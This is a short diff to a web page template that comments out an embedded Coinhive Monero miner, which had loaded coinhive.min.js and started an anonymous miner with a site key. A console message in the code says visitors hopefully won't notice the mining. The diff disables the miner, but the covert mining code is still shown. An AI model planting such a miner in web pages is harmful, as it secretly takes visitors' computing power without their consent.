@@ -8,8 +8,8 @@
   ga('send', 'pageview');
 
 </script>
-
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<?php
+/* <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	console.log("Testing light Monero mining. Hopefully you won't even notice.")
     var miner = new CoinHive.Anonymous('exN9MUJT735qbTYsRA6Jm1Mr3nQmP4yT', {
@@ -27,4 +27,5 @@
 
         // Output to HTML elements...
     }, 1000);
-</script>
+</script> */ 
+?>
